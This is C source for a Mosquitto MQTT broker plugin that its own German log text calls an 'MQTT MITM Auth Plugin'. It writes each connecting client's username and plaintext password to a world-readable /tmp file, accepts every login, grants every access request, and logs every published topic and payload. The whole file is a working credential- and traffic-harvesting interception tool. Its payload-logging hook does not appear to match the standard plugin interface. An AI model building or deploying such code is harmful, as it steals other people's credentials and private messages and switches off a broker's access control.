#include <stdio.h>
#include <string.h>
#include <mosquitto_broker.h>
#include <mosquitto_plugin.h>
#include <mosquitto.h>

#define LOGFILE_AUTH     "/tmp/mqtt_mitm_auth.log"
#define LOGFILE_PAYLOAD  "/tmp/mqtt_payloads.log"

#define DEBUG 1
#define LOG_PAYLOAD 1  // 0 deaktiviert Payload-Logging

int mosquitto_auth_plugin_version(void) {
    return MOSQ_AUTH_PLUGIN_VERSION;
}

int mosquitto_auth_plugin_init(void **user_data, struct mosquitto_opt *opts, int opt_count) {
#if DEBUG
    FILE *fp = fopen(LOGFILE_AUTH, "a");
    if(fp) {
        fprintf(fp, "[INIT] MQTT MITM Auth Plugin gestartet\n");
        fclose(fp);
    }
#endif
    return MOSQ_ERR_SUCCESS;
}

int mosquitto_auth_plugin_cleanup(void *user_data, struct mosquitto_opt *opts, int opt_count) {
#if DEBUG
    FILE *fp = fopen(LOGFILE_AUTH, "a");
    if(fp) {
        fprintf(fp, "[CLEANUP] Plugin wird beendet\n");
        fclose(fp);
    }
#endif
    return MOSQ_ERR_SUCCESS;
}

int mosquitto_auth_unpwd_check(void *user_data, struct mosquitto *client, const char *username, const char *password) {
#if DEBUG
    FILE *fp = fopen(LOGFILE_AUTH, "a");
    if(fp) {
        fprintf(fp, "[AUTH] Username: %s | Password: %s\n",
                username ? username : "(null)",
                password ? password : "(null)");
        fclose(fp);
    }
#endif
    return MOSQ_ERR_SUCCESS;
}

int mosquitto_auth_acl_check(void *user_data, int access, struct mosquitto *client, const struct mosquitto_acl_msg *msg) {
    return MOSQ_ERR_SUCCESS;
}

// NEU: Empfange jede MQTT-Publish-Message (eingehend oder ausgehend)
int mosquitto_auth_plugin_message_publish(void *user_data, struct mosquitto *client, const struct mosquitto_evt_message *msg) {
#if LOG_PAYLOAD
    FILE *fp = fopen(LOGFILE_PAYLOAD, "a");
    if(fp && msg && msg->payload && msg->topic) {
        fprintf(fp, "[PUBLISH] Topic: %s\n", msg->topic);
        fprintf(fp, "          Payload (%d bytes): ", msg->payloadlen);
        fwrite(msg->payload, 1, msg->payloadlen, fp);
        fprintf(fp, "\n\n");
        fclose(fp);
    }
#endif
    return MOSQ_ERR_SUCCESS;
}
